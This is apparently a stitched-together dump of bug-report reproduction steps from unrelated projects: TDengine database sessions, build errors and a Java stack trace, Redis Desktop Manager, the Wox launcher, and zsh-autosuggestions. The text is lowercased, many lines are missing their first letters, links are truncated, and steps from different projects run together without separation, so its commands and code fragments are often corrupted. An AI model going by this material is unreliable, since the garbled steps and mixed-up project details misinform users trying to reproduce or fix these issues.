query ok, 0 row(s) affected (0.000828s) taos> use db;
database changed
taos> reset query cache;
query ok, 0 row(s) affected (0.000038s) taos> reset query cache;
query ok, 0 row(s) affected (0.000050s) taos> create table tb1590054604184 (ts timestamp, speed int); db error: vg init failed
create table ta_se_mt2 (ts timestamp, tbcol int) tags(tgcol1 bool, tgcol2 int)
create table ta_se_tb2 using ta_se_mt2 tags( 1, 2 )
alter table ta_se_tb2 set tag tgcol1=false db error: operations not support
here is operate in version 1.6.5.7
before i got this bug execute some test with bad grammar continuous query sql in a long time ago
2.create a super table
3.create a continuous query
4.i found a tag with the wrong data type in the super table
5.drop that tag, this operation cost about 10 minutes
6.got the message 'can't connect the database server'
7.check the system progress, the database progress is gone
8.check the system memory and cpu load, the cpu is almost 100% because other progress
9.i don't know whether my operation caused crash or cpu load is too high here is operate in version 1.6.5.9
restart the database
the database is working, then i check the log, i found the database still reload the bad grammar continuous query sql.
aosd
dl ml dengine error: invalid query message
./build/bin/taos -c test/cfg
type in '?;' and press enter
a runtime assertion is reported before core-dump
go to 'develop' brach
run command below create database d1;
create table d1.t2 (ts timestamp, i int);
create table d1.t1 (ts timestamp, i int);
insert into d1.t1 values(now, 1);
insert into d1.t1 values(now, 2);
insert into d1.t1 values(now, 3);
insert into d1.t1 values(now, 4)(now+1s,5);
select * from d1.t1;
select count(*) from d1.t1;
select * from d1.t1;
restart the taosd process
run command below:
insert into d1.t1 values(now, 1);
insert into d1.t1 values(now, 2);
insert into d1.t1 values(now, 3);
insert into d1.t1 values(now, 4)(now+1s,5);
select * from d1.t1;
select * from d1.t1;
stop the process
git clone
sudo cmake .
-dcputype=aarch32
![image]( 3
sudo make ![image](
![image](
aos elect create_time,create_by,method,client_ip,class_name,method_name,request_url,params,exception_msg,exception_code,server_ip from log_api.t_log_api where server_ip = "0101040150827073" order by create_time desc limit 10 offset 120;
insert some data( < 10 items) to the server(tdengine container)
restart the client which is a flask+uwsgi web server container, the client connect to tdengine server success
trigger query history data from web ui container
the client hang on the query and wont return anymore
check the log in client side, just an error msg:"error rpc tsc-mgmt cid:0, sid:2 session is already released" **debug**
verbose log level in client side 2
restart the client container and reproduce and save the taoslog0.0
trigger the query by exec the python unitest which send the same query cmd, and the query return success, and the log save to taoslog1.0
pm dengine
oot '' alter user root pass mypassword
4. taos -uroot -pmypassword **environment:** - os: centos 7.0 - tdengine version 1.6.5.5
ystemctl start taosd.service
ystemctl status taosd
`cat "/var/log/taos/taosdlog.1"`
`03/20 10:28:01.883841 26781 7f4987f6d700 error tmr failed to create timer`
org.springframework.jdbc.uncategorizedsqlexception: statementcallback; uncategorized sqlexception for sql [ create database if not exists wzfdd5 ]; sql state [null]; error code [0]; this operation is not supported currently!; nested exception is java.sql.sqlexception: this operation is not supported currently! at org.springframework.jdbc.support.abstractfallbacksqlexceptiontranslator.translate(abstractfallbacksqlexceptiontranslator.java:84) at org.springframework.jdbc.support.abstractfallbacksqlexceptiontranslator.translate(abstractfallbacksqlexceptiontranslator.java:81) at org.springframework.jdbc.support.abstractfallbacksqlexceptiontranslator.translate(abstractfallbacksqlexceptiontranslator.java:81) at org.springframework.jdbc.core.jdbctemplate.execute(jdbctemplate.java:415) at org.springframework.jdbc.core.jdbctemplate.execute(jdbctemplate.java:439) at com.wrt.wl.webservices.service.impl.bsserviceimpl.bslogin(bsserviceimpl.java:54) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:497) at org.apache.cxf.service.invoker.abstractinvoker.performinvocation(abstractinvoker.java:180) at org.apache.cxf.service.invoker.abstractinvoker.invoke(abstractinvoker.java:96) at org.apache.cxf.jaxrs.jaxrsinvoker.invoke(jaxrsinvoker.java:189) at org.apache.cxf.jaxrs.jaxrsinvoker.invoke(jaxrsinvoker.java:99) at org.apache.cxf.interceptor.serviceinvokerinterceptor$1.run(serviceinvokerinterceptor.java:59) at org.apache.cxf.interceptor.serviceinvokerinterceptor.handlemessage(serviceinvokerinterceptor.java:96) at org.apache.cxf.phase.phaseinterceptorchain.dointercept(phaseinterceptorchain.java:308) at org.apache.cxf.transport.chaininitiationobserver.onmessage(chaininitiationobserver.java:121) at org.apache.cxf.transport.http.abstracthttpdestination.invoke(abstracthttpdestination.java:254) at org.apache.cxf.transport.servlet.servletcontroller.invokedestination(servletcontroller.java:234) at org.apache.cxf.transport.servlet.servletcontroller.invoke(servletcontroller.java:208) at org.apache.cxf.transport.servlet.servletcontroller.invoke(servletcontroller.java:160) at org.apache.cxf.transport.servlet.cxfnonspringservlet.invoke(cxfnonspringservlet.java:180) at org.apache.cxf.transport.servlet.abstracthttpservlet.handlerequest(abstracthttpservlet.java:299) at org.apache.cxf.transport.servlet.abstracthttpservlet.dopost(abstracthttpservlet.java:218) at javax.servlet.http.httpservlet.service(httpservlet.java:644) at org.apache.cxf.transport.servlet.abstracthttpservlet.service(abstracthttpservlet.java:274) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:291) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:206) at org.apache.tomcat.websocket.server.wsfilter.dofilter(wsfilter.java:52) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:239) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:206) at com.thetransactioncompany.cors.corsfilter.dofilter(corsfilter.java:209) at com.thetransactioncompany.cors.corsfilter.dofilter(corsfilter.java:244) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:239) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:206) at org.springframework.web.filter.characterencodingfilter.dofilterinternal(characterencodingfilter.java:121) at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:239) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:206) at org.apache.logging.log4j.web.log4jservletfilter.dofilter(log4jservletfilter.java:71) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:239) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:206) at org.apache.catalina.core.standardwrappervalve.invoke(standardwrappervalve.java:219) at org.apache.catalina.core.standardcontextvalve.invoke(standardcontextvalve.java:106) at org.apache.catalina.authenticator.authenticatorbase.invoke(authenticatorbase.java:505) at org.apache.catalina.core.standardhostvalve.invoke(standardhostvalve.java:142) at org.apache.catalina.valves.errorreportvalve.invoke(errorreportvalve.java:79) at org.apache.catalina.valves.abstractaccesslogvalve.invoke(abstractaccesslogvalve.java:610) at org.apache.catalina.core.standardenginevalve.invoke(standardenginevalve.java:88) at org.apache.catalina.connector.coyoteadapter.service(coyoteadapter.java:534) at org.apache.coyote.http11.abstracthttp11processor.process(abstracthttp11processor.java:1081) at org.apache.coyote.abstractprotocol$abstractconnectionhandler.process(abstractprotocol.java:658) at org.apache.coyote.http11.http11nioprotocol$http11connectionhandler.process(http11nioprotocol.java:222) at org.apache.tomcat.util.net.nioendpoint$socketprocessor.dorun(nioendpoint.java:1566) at org.apache.tomcat.util.net.nioendpoint$socketprocessor.run(nioendpoint.java:1523) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1142) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:617) at org.apache.tomcat.util.threads.taskthread$wrappingrunnable.run(taskthread.java:61) at java.lang.thread.run(thread.java:745)
caused by: java.sql.sqlexception: this operation is not supported currently! at com.taosdata.jdbc.tsdbstatement.getwarnings(tsdbstatement.java:129) at org.springframework.jdbc.core.jdbctemplate.handlewarnings(jdbctemplate.java:1395) at org.springframework.jdbc.core.jdbctemplate.execute(jdbctemplate.java:405) ..
i follow this webpage [
and when i typed `make` command, got error ```
in file included from d:/tdengine/src/client/src/tscsql.c:16:
d:/tdengine/src/inc/tast.h:54:3: error: unknown type name '__compar_fn_t' 54 | __compar_fn_t compare; // filter function | ^~~~~~~~~~~~~
in file included from d:/tdengine/src/inc/hashutil.h:19, from d:/tdengine/src/inc/hash.h:23, from d:/tdengine/src/client/src/tscsql.c:17:
d:/tdengine/src/os/windows/inc/os.h:52: warning: "s_irwxu" redefined 52 | #define s_irwxu _s_iread |
in file included from d:/tdengine/src/os/windows/inc/os.h:38, from d:/tdengine/src/inc/hashutil.h:19, from d:/tdengine/src/inc/hash.h:23, from d:/tdengine/src/client/src/tscsql.c:17:
c:/msys64/mingw64/x86_64-w64-mingw32/include/sys/stat.h:149: note: this is the location of the previous definition 149 | #define s_irwxu _s_irwxu |
in file included from d:/tdengine/src/inc/hashutil.h:19, from d:/tdengine/src/inc/hash.h:23, from d:/tdengine/src/client/src/tscsql.c:17:
d:/tdengine/src/os/windows/inc/os.h:53: warning: "s_irwxg" redefined 53 | #define s_irwxg _s_iwrite |
in file included from d:/tdengine/src/os/windows/inc/os.h:38, from d:/tdengine/src/inc/hashutil.h:19, from d:/tdengine/src/inc/hash.h:23, from d:/tdengine/src/client/src/tscsql.c:17:
c:/msys64/mingw64/x86_64-w64-mingw32/include/sys/stat.h:158: note: this is the location of the previous definition 158 | #define s_irwxg (s_irwxu >> 3) |
in file included from d:/tdengine/src/inc/hashutil.h:19, from d:/tdengine/src/inc/hash.h:23, from d:/tdengine/src/client/src/tscsql.c:17:
d:/tdengine/src/os/windows/inc/os.h:54: warning: "s_irwxo" redefined 54 | #define s_irwxo _s_iwrite |
in file included from d:/tdengine/src/os/windows/inc/os.h:38, from d:/tdengine/src/inc/hashutil.h:19, from d:/tdengine/src/inc/hash.h:23, from d:/tdengine/src/client/src/tscsql.c:17:
c:/msys64/mingw64/x86_64-w64-mingw32/include/sys/stat.h:163: note: this is the location of the previous definition 163 | #define s_irwxo (s_irwxg >> 3) |
in file included from d:/tdengine/src/inc/hashutil.h:19, from d:/tdengine/src/inc/hash.h:23, from d:/tdengine/src/client/src/tscsql.c:17:
d:/tdengine/src/os/windows/inc/os.h:57: warning: "f_ok" redefined 57 | #define f_ok 00 //existence only |
in file included from c:/msys64/mingw64/x86_64-w64-mingw32/include/direct.h:10, from d:/tdengine/src/os/windows/inc/os.h:21, from d:/tdengine/src/inc/hashutil.h:19, from d:/tdengine/src/inc/hash.h:23, from d:/tdengine/src/client/src/tscsql.c:17:
c:/msys64/mingw64/x86_64-w64-mingw32/include/io.h:182: note: this is the location of the previous definition 182 | #define f_ok 0 /* check for file existence */ |
in file included from d:/tdengine/src/inc/hashutil.h:19, from d:/tdengine/src/inc/hash.h:23, from d:/tdengine/src/client/src/tscsql.c:17:
d:/tdengine/src/os/windows/inc/os.h:58: warning: "w_ok" redefined 58 | #define w_ok 02 //write - only |
in file included from c:/msys64/mingw64/x86_64-w64-mingw32/include/direct.h:10, from d:/tdengine/src/os/windows/inc/os.h:21, from d:/tdengine/src/inc/hashutil.h:19, from d:/tdengine/src/inc/hash.h:23, from d:/tdengine/src/client/src/tscsql.c:17:
c:/msys64/mingw64/x86_64-w64-mingw32/include/io.h:184: note: this is the location of the previous definition 184 | #define w_ok 2 /* check for write permission */ |
in file included from d:/tdengine/src/inc/hashutil.h:19, from d:/tdengine/src/inc/hash.h:23, from d:/tdengine/src/client/src/tscsql.c:17:
d:/tdengine/src/os/windows/inc/os.h:59: warning: "r_ok" redefined 59 | #define r_ok 04 //read - only |
in file included from c:/msys64/mingw64/x86_64-w64-mingw32/include/direct.h:10, from d:/tdengine/src/os/windows/inc/os.h:21, from d:/tdengine/src/inc/hashutil.h:19, from d:/tdengine/src/inc/hash.h:23, from d:/tdengine/src/client/src/tscsql.c:17:
c:/msys64/mingw64/x86_64-w64-mingw32/include/io.h:185: note: this is the location of the previous definition 185 | #define r_ok 4 /* check for read permission */ |
in file included from d:/tdengine/src/inc/hashutil.h:19, from d:/tdengine/src/inc/hash.h:23, from d:/tdengine/src/client/src/tscsql.c:17:
d:/tdengine/src/os/windows/inc/os.h:60: warning: "x_ok" redefined 60 | #define x_ok 06 //read and write |
in file included from c:/msys64/mingw64/x86_64-w64-mingw32/include/direct.h:10, from d:/tdengine/src/os/windows/inc/os.h:21, from d:/tdengine/src/inc/hashutil.h:19, from d:/tdengine/src/inc/hash.h:23, from d:/tdengine/src/client/src/tscsql.c:17:
c:/msys64/mingw64/x86_64-w64-mingw32/include/io.h:183: note: this is the location of the previous definition 183 | #define x_ok 1 /* check for execute permission
make[2]: *** [src/client/cmakefiles/taos_static.dir/build.make:291: src/client/cmakefiles/taos_static.dir/src/tscsql.c.obj] error 1
make[1]: *** [cmakefiles/makefile2:759: src/client/cmakefiles/taos_static.dir/all] error 2
make: *** [makefile:155: all] error 2
modify any source code file unrelated to java, say vnodecommit.c, and then recompile the project.
download software, build, and watch the commands.
build the software, and follow the instructions in the "quick run" section.
just try to install with `install td-connector --save`
ybatis dengine ql = select * from people
mkdir debug
sudo cmake .
-darmver=arm64
sudo make at the fourth step you will see the error
create table m1(ts timestamp, k int) tags(a int);
create table tm0 using m1 tags(0);
create table tm1 using m1 tags(1); insert into tm0 values(now, 1);
insert into tm1 values(now, 2); select a, k-k from m1;
``` invalid sql error will raise.
refer to [here](
refer to [here](
go to '.\\tdengine-develop\\src\\system\\detail\\src\\mgmtmeter.c'
type in 'mgmtcheckmeterlimit' int mgmtcheckmeterlimit(sacctobj *pacct, screatetablemsg *pcreate); int code = mgmtcheckmeterlimit(pacct, pcreate); but mgmtcheckmeterlimit() with 2 arguments is not implemented
there is a implement with 1 argument in .\\tdengine-develop\\src\\system\\lite\\src\\mgmtacct.spec.c int mgmtcheckmeterlimit(sacctobj *pacct) { return 0; } **the result**
the compiler would be ok
however, the runtime may crash.
create database if not exists test;
create table if not exists test.demo (ts timestamp, task_id binary(40), message binary(20));
insert into test.demo(ts, task_id, message) values(0, '123', '11111\\\\'99911111') ;
see error db error: invalid sql: syntax error near "\') ;" () expected) 5.insert into test.demo(ts, task_id, message) values(0, \'123\', \'111119999911111999991111199999\') ;
see error db error: invalid sql: syntax error near "111119999911111999991111199999\') ;" (string data overflow)
on a multi-core (>4) server, runs taosd, and run a client application which launches over 50 threads to insert data into server in full horse power, it may happens.
open any documentation page (english version) with a browser, and you'll see them littered around.
`package cn.meirenji.core.service; import com.alibaba.druid.pool.druiddatasource;
import com.alibaba.druid.pool.druiddatasourcefactory;
import com.taosdata.jdbc.tsdbpreparedstatement; import java.sql.*;
import java.util.properties; /** * all rights reserved, designed by www.uuhui.vip * * @version v1.0 * @description: todo * @author: alex * @copyright: 2019 www.uuhui.vip inc
all rights reserved
public class testtdenginedruid { private static final string tsdb_driver = "com.taosdata.jdbc.tsdbdriver"; private static druiddatasource druiddatasource = null; public static void main(string[] args) { string host = "10.0.0.105"; int port = 0; string username = "root"; string password = ""; properties properties = new properties(); string jdbcurl = "jdbc:taos://"+host+":"+port+"/mrd_data_batch?user="+username+"&password="+password+"&config=/etc/taos"; properties.setproperty("driverclassname", tsdb_driver); properties.setproperty("url", jdbcurl); properties.setproperty("username", username); properties.setproperty("password", password); properties.setproperty("filters", "stat"); properties.setproperty("maxactive", "100"); properties.setproperty("initialsize", "20"); properties.setproperty("maxwait", "60000"); properties.setproperty("minidle", "8"); properties.setproperty("timebetweenevictionrunsmillis", "60000"); properties.setproperty("minevictableidletimemillis", "30000"); properties.setproperty("testwhileidle", "true"); properties.setproperty("testonborrow", "true"); properties.setproperty("testonreturn", "true"); properties.setproperty("poolpreparedstatements", "false"); properties.setproperty("maxopenpreparedstatements", "20"); properties.setproperty("asyncinit", "true"); properties.setproperty("removeabandoned", "true"); properties.setproperty("removeabandonedtimeout", "180"); properties.setproperty("logabandoned", "false"); if (druiddatasource == null) { try { druiddatasource = (druiddatasource) druiddatasourcefactory.createdatasource(properties); } catch (exception e) { e.printstacktrace(); } } try { connection connection = druiddatasource.getconnection(); string rawsql = "select * from batch_342465909421506560"; preparedstatement pstmt = (tsdbpreparedstatement) connection.preparestatement(rawsql); resultset resset = pstmt.executequery(); while(resset.next()) { system.out.println(resset.getlong("data_time")); } } catch (sqlexception e) { e.printstacktrace(); } } }
` ***************
, ruid emo, .
1: a cache block a for a table is not full, then commit, this cache block will be saved to disk
firstkey in this cache block is f, last key is l, there are total t records
since not full, this cache block wont be free 2: after commit, insert some records, a new cache block b is allocated
suppose r records are inserted into cache block a, the rest is in cache block b
3: import a record with key between f and l, r records will be moved to the head of cache block a, and there are t empty rows
4: import a record into cache block a, records in cache block b will be moved to block a.
5: block b will have 0 points, but number of blocks is still 2
this will cause serious issue, since number of blocks is messed up.
execute ` create database bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb; ` and ` drop database bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb; `
the database is still existed.
and if create a table in this database, you will get a ' table name too long '
ql `select avg(vol_c),max(vol_c),min(vol_c) from fmex.btc_p_info where ts<now interval(3m) order by ts desc limit 1000;` ql taos
`taosd: /home/taosdata/tdengine/src/system/detail/src/vnodequeryimpl.c:3955: gettimestampindiskblock: assertion `pquery->pos >= 0 && pquery->pos < pblock->numofpoints' failed.`
om
use a not existing user name to connect to server
2: the server will return an error
3: client connects to server again, and try a few thousand times.
create database, create tables, insert data, then drop tables, create tables again, and insert data
it may cause this issue when importing history data which spans multiple files
create database d1;
create database d2; use d1;
create table tm0(ts timestamp, k int); use d2;
create table m1(ts timestamp, k int) tags(a int);
``` + disconnect from tdengine.
+ connect to d2 in the connect function, and during the connection, the default db is set to d2
describe d1.tm0;
insert into tm0 using m1 tags(1) values(now, 1);
root@localhost ~#:taosd it seem when monitorsysteminit , can't create database log
uthentication failure
insert massive data into database continuously by calling taos_query in one connection
(800 records per second)
wait for at least 46 hours.
application hangs.
install tdengine on ubuntu 18.04.3 with raspberry pi 3 as host 2
service won't start 3
"service taosd status" with out comment "restart=always"
taosd.service: failed to execute command: exec format error
taosd.service: failed at step exec spawning /usr/bin/taosd: exec format error
go to taos shell
type in follows sql commands: create database if not exists db1; use db1; create table if not exists tb1 (ts timestamp, temperature int, humidity float); insert into tb1 values('2010-01-01 00:00:00.000', 37, 50.1); insert into tb1 values('2009-01-01 00:00:00.000', 37, 50.1); tsdb error: timestamp out of range
`docker run -it --rm ubuntu:16.04 bash`
`apt install -y cmake build-essential git`
clone the repository and do building as the getting started guide.
run `make install` after `cmake --build .`
configure the telegraf, run it as a service.
run the taosd which is built by myself without any modification.
.6.1.6 .6.2.0
windows 10 .6.1.6 .6.2.0
windows 10 aos.exe
how stables
select count(*) from
select count(*) from lient no disk space
windows server 2012
run some executions
dengine
emobe.sh entos dengine
![image](
message: "taos error: insert into tbl using stbl_history tags (xxx) values (\'1566864002679\', \'2019-08-27\', \'0\', \'0.00\', \'0\', \'0.00\', \'0\', \'0\')"
arguments: (programmingerror('too slow',),)
1. ttp select * from taiyuan_db.equipmentstatus order by ts desc limit 50 offset 0
fork at least 5 client applications, it may happen
1.install xcode with xcode build tools.
2.nstall homebrew.
3.copy cd ./src && cp ./resources/info.plist.sample ./resources/info.plist.
4.building rdm dependencies require i.a
openssl, cmake and python3(python3.8)
install them: brew install openssl cmake python3
5.install python requirements pip3 install -t ../bin/osx/release -r py/requirements.txt
7.install qt 5.15
add qt creator and under qt 5.15.x add qt charts module.
8.open ./src/rdm.pro in qt creator.
9.run build.
sudo apt update 2
sudo apt install snapd 3
sudo snap install core 4
sudo snap install redis-desktop-manager
after it finish download and install, it fail: ```bash error: cannot perform the following tasks: - mount snap "redis-desktop-manager" (427) (snap "redis-desktop-manager" assumes unsupported features: snapd2.38 (try to update snapd and refresh the core snap)) ``` 5
i also try to start it from directory, fail again: ```bash $ cd /usr/share/redis-desktop-manager/bin $ ls crashreporter qt.conf rdm rdm.png $ ./rdm ./rdm: symbol lookup error: /lib/x86_64-linux-gnu/libx11.so.6: undefined symbol: xcb_wait_for_reply64 ```
enable live update
add a key via gui
install 2020.3 2
upgrade to 2020.4
try to start rdm
rdm.exe missing in the install folder
select a db and expand one level into a namespace/nested key
click analyse memory
expand a key the next level down
unable to analyse memory of that key and its children without reloading the parent
just open the log panel.
create a few keys:
:$_tag_$:tagmember:104508
:$_tag_$:tagmember:104510
:$_tag_$:tagmember:104511
connect to redis
click on redis console
type cluster info or keys *whatever*
see returned "connected"
create a new windows 10 azure vm
log in with the azure credentials established in 1.
load the microsoft store
log in with my windows credentials that i purchased rdm with
download and install rdm.
installation guide of windows build
using the cli create a new item in a new stream: xadd mystream * sensor-id 1 temperature 1
"1598776376404-0" show the data in the viewer and you see:
{"sensor-id":"mq","temperature":"mq"} i would expect to see the same as i entered rather than "mq" for the values? - redis-server version 6.0.6
- redis desktop manager 2020.2+85dd8b35 from a snap
install 2020.2.225 on windows server 2019.
select a db index and click on 'add new key'
add a new hash record with anything for the hash key/value
select that record and click the hash entry
scroll down to the "value" editor
click "copy to clipboard"
paste the contents into a text editor
configure a redis server using a self-signed certificate
configure rdm to connect to this server
test connection
there is .desktop file created, i don't know if this issue is from rdm or snap
so i tried to run it from `/snap/redis-desktop-manager/current/opt/redis-desktop-manager`
launch terminal in the above directory
error `"./rdm: error while loading shared libraries: libbotan-2.so.8: cannot open shared object file: no such file or directory
`$ redis-desktop-manager.rdm`
connect to redis server cluster
double click any key
delete some namespace
pop up window appear
click on 'delete namespace'
click on 'delete keys'
click on 'yes'
nothing happens / log is empty
install from snap 1
go to 'database on other server'
click on 'copy keys from this database to another'
in window select localhost and any database 4
press 'copy keys' button
nothing happens logs:
![ 2020-05-29 08-46-15](
add formatters to `~library/containers/com.redisdesktop.rdm/data/library/preferences/rdm`
start redisdesktopmanager
observe gui load
click anything, nothing.
drag window to other monitor's desktop space (for example, open rdm on internal screen, and then drag the window to my external monitor's desktop)
the window will be transparent! as desktop wallpaper shown.
click on 'connect to redis server' button
cache a key and then get the keys and look at value
go to 'install the redis desktop manager latest version and launch' 2
click on 'connect to redis server' and provide the redis server info
scroll down to 'test connection', i can not see the tes connection.
follow the [build from source]( #build-from-source) instructions on windows
click view as php 0.8.8
![088]( 2020
![2020]( platform
windows 10 redis server 3.2.10
serialize value
write to redis
read by rdm
create a string key
set the view to "json"
insert some simple json with curly braces inside a string:
{"text": "my {{test}} string"}
save the value
reload the key
json is now { "text": "my{{test}}string" } (note missing spaces before and after curly braces) mostly same behavior if you use square brackets, but only removes the trailing space.
i followed this video for installing redis with the only change being the version of redis for 5.0.7:
click `ttl`
set new ttl : -1
create aws elasticache cluster with two shards (primary node)
connect via ssh tunneling
connect to cluster
try add and read key
i guess without my database entries, it is impossible to reproduce and due to sensitivity of the data stored, its not possible to share the models return by the query.
install version 2019.4.175
connect to my redis server without any credential and succeded
i can see the keys.
then try to view the value of random key, and application exited without any hanging nor warning
then go to windows event logs, saw crash log.
1 git clone --recursive
2 cd redisdesktopmanager
4 ./configure
zsh: no such file or directory: ./configure
add & save connection with ssh key
try to connect
create key "aaa" with value \'{"a":42}\'
open it in redis
set type to json
change value to \'{"a":422}\'
click any other key to reset viewer
click back on "aaa" key
}nt="1" />{ "a": 42
``` so redis manager broke the key!
start the application
my english is not well
sorry : ( i download redis-desktop-manager from snaped can need modify redisdesktop conf ?
i find gtk3.0 dir
how modify ?
execute the application under proxy
launch 2019.2 on a mac
download rdm 2019.2
open application
build instructions
double click rdm.exe
attempt to connect to the redis server
have 7m keys in a redis instance
open redisdesktopmanager
connect to a redis instance.
go to 'left menu'
click on 'db0 which has 7m keys' 4
waiting for a long time with 'scan keys'.
run your program read from redis while waiting for 'scan keys'.
see error "busy redis is busy running a script"
select key that you want to populate
click "add row" and enter value and score
click "ok" to add and then application crash
i really do not know how it came up like that
i happened firstly after using version 2019.
go to redis desktop manager
click on connect to connect to the redis server
expand the nodes and notice the child nodes
the keys are duplicated
each key is shown twice.
select your database
try to expand a large group of keys.
app crashes
choose one data with json-format
change "view as" from "json" to "hex table"
change "view as" to "json"
installed from snap 2
start in console env bamf_desktop_file_hint=/var/lib/snapd/desktop/applications/redis-desktop-manager_rdm.desktop /snap/bin/redis-desktop-manager.rdm app font: "open sans" 11
propsreply "an apparmor policy prevents this sender from sending this message to this recipient; type=\\"method_call\\", sender=\\":1.82\\" (uid=1000 pid=12090 comm=\\"/snap/redis-desktop-manager/264/opt/redis-desktop-\\") interface=\\"org.freedesktop.dbus.properties\\" member=\\"getall\\" error name=\\"(unset)\\" requested_reply=\\"0\\" destination=\\"org.freedesktop.networkmanager\\" (uid=0 pid=1194 comm=\\"/usr/sbin/networkmanager --no-daemon \\")"
nmreply "an apparmor policy prevents this sender from sending this message to this recipient; type=\\"method_call\\", sender=\\":1.82\\" (uid=1000 pid=12090 comm=\\"/snap/redis-desktop-manager/264/opt/redis-desktop-\\") interface=\\"org.freedesktop.networkmanager\\" member=\\"getdevices\\" error name=\\"(unset)\\" requested_reply=\\"0\\" destination=\\"org.freedesktop.networkmanager\\" (uid=0 pid=1194 comm=\\"/usr/sbin/networkmanager --no-daemon \\")"
"object path cannot be empty"
detected locale: "ru_ru"
load translations file for locale: "ru_ru"
terminate called after throwing an instance of 'std::runtime_error' what(): invalid connections config
error: can't launch crashreporter!
connect redis instance
see the cache of keys on left side window
when no of keys are too many then scroll bar appears on left side window
try to use the scroll bar and see we can't hold it to drag down or up.
go to console window
subscribe channel
receive very long message (6,000~)
can't drag text or scroll horizontal
result is `0`
press alt + tab
type in file or folder name
no error, but no results.
compile code
run in debug mode using vs
open settings and change **last query style**
![image](
invoke alt+space to show launcher
type something and invoke command (in my case i opened a folder on the 2nd screen)
repeat step 2
type a calculation
delete some digits and type in new ones
sometimes it will fail to register the last digit and the calculation result will be wrong
lauch obs studio with obs ndi plugin and ndi runtime installed.
sorry i don't know why the error occurs, and how to reproduce it.
invoke wox (alt+space)
type a query, e.g
navigate to the second result by pressing down arrow
close the panel with esc
re-invoke wox (alt+space)
type a new query, e.g
"file" wox keeps the second item highlighted which causes you to select the wrong entry unless you pause and re-position it.
search for "sti"
set "shell" plugin enabled
tick the "replace win+r"
try and use win+r combo to use shell plugin - you will certainly encounter problems such as described before ###
go to 'start menu'
click on 'wox'
nothing happens
close up the laptop.
relaunch the laptop.
install wox
hit hotkey, write in `test`
see random results, none of which even vaguely reference `test`
type anything
wox doesn't respond to the entry
hide wox using esc (meantime opening plugin settings see no thumbnails of the installed plugins)
wait for couple minutes and the error window appears.
- install custom theme
_ run installer to update wox
launch wox by hot key
ocassionally ,would show up a big "|"
no key responding.
go into the app settings
click the new tab section
try to change an action keyword for any given extension
no error is reported
the application stops responding and promptly closes.
- was trying to execute `date -u +%v$(uname)|sha1sum|sed 's/\\w//g'` but unfortunately executed : ![image](
>notice the missing `'` and additional `\ \ `
- after this the problem started
% source path/to/zsh-autosuggestions.zsh
% # 1) attempt to show a suggestion by typing part of "source"
% setopt force_float
% # 2) attempt to once again show a suggestion by typing part of "source".
% autoload -uz compinit && compinit
% source .oh-my-zsh/custom/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh
% export zsh_autosuggest_strategy=(completion)
% ls<space>
$ git clone --depth 1 --branch v0.6.4 $ zsh -df
source the following minimal zshrc
source zsh-autosuggestions/zsh-autosuggestions.zsh bindkey -v autoload -uz add-zle-hook-widget zle_autosuggest_line_init() { zle autosuggest-enable
} zle_autosuggest_keymap_select() { zle autosuggest-clear zle autosuggest-disable # have also tried this
# zle vi-kill-eol # uncomment to see this works, but something comes along later and redraws the command line
} # this doesn't work either.
# zsh_autosuggest_clear_widgets+=("zle_autosuggest_keymap_select") zle -n zle_autosuggest_line_init
zle -n zle_autosuggest_keymap_select
add-zle-hook-widget -uz line-init zle_autosuggest_line_init
add-zle-hook-widget -uz keymap-select zle_autosuggest_keymap_select
then seed the suggestion, recall it, and hit escape:
$ ls <escape>
the second `ls ` above will add the `/tmp` suggestion as expected
when i hit esc to go into vicmd mode, i'd expect the suggestion to be cleared and autosuggestions to be disabled
indeed, autosuggestions do get disabled, but `/tmp` remains on the command line
what's really strange, however, is if i uncomment the `sleep 3`, you can actually see that things _are_ happening as expected at that point
after 3 seconds, however, _something_ comes along an redraws the command line with `/tmp` appended again.
freshly installed zsh, oh_my_zsh, and added zsh-autosuggestions plugin if i do this it's working fine.
% source path/to/zsh-autosuggestions.zsh
![screenshot from 2020-08-16 19-48-15](
zsh_autosuggest_highlight_style="fg=#888888, bg=black,bold"
zsh_autosuggest_strategy=(match_prev_cmd completion history)
set zsh_autosuggest_use_async
type ".zsh" in home directory (or provoke any autosuggestion)
see the autocompletion in gray
hit right arrow key
see the completed string still in gray
- clone repo with: `git clone ${zsh_custom:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions`
- modify my `.zshrc` file and add the plugin: ```
plugins=(git zsh-autosuggestions)
- reload shell with `zsh` on the terminal.
- it outputs: ```
/home/raul/.oh-my-zsh/custom/plugins/zsh-autosuggestions/zsh-autosuggestions.plugin.zsh:source:1: no such file or directory: /home/raul/.oh-my-zsh/custom/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh^m
the "premise" and the "description" should make the reproduction possible
normal curl call is working but if i am using query parameter with aws elb, its producing error:
zsh: no matches found:
enable zsh-autosuggestions.
hit enter in the terminal.
run `source .zshrc` command.
enter other commands to see tips
* <kbd>ctrl</kbd><kbd>v</kbd> + right arrow outputs `^[oc`.
* `bindkey \'^[oc\'` outputs `"^[oc" forward-char`
i input the following in the shell:
% typeset -ga zsh_autosuggest_partial_accept_widgets
